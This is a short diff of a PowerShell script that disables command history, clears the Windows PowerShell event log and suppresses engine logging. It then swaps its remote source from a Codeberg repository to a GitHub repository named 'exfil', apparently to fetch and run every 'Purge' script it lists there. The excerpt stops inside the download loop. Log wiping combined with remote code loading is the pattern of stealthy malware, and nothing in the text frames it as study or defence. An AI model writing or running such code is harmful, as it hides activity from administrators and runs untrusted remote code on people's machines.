@@ -22,16 +22,16 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$activecorepurge = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/HighRiskExecs/ActiveCoreTaskPurge.ps1"
-$subfolder = "Sanitation"
+$activecorepurge = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/HighRiskExecs/ActiveCoreTaskPurge.ps1"
 $owner = "sempiampi"
-$repo = "mavericks"
-$uri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$subfolder"
+$repo = "exfil"
+$branch = "main"
+$uri = "https://api.github.com/repos/$owner/$repo/contents"
 $response = Invoke-RestMethod -Uri $uri
 $purgeFiles = @()
 foreach ($item in $response) {
     if ($item.type -eq "file" -and $item.name -like "*Purge*") {
-        $purgeFiles += "https://codeberg.org/$owner/$repo/raw/branch/main/$($item.path)"
+        $purgeFiles += "https://api.github.com/repos/$owner/$repo/contents/$($item.path)"
     }
 }
 foreach ($purgeFile in $purgeFiles) {
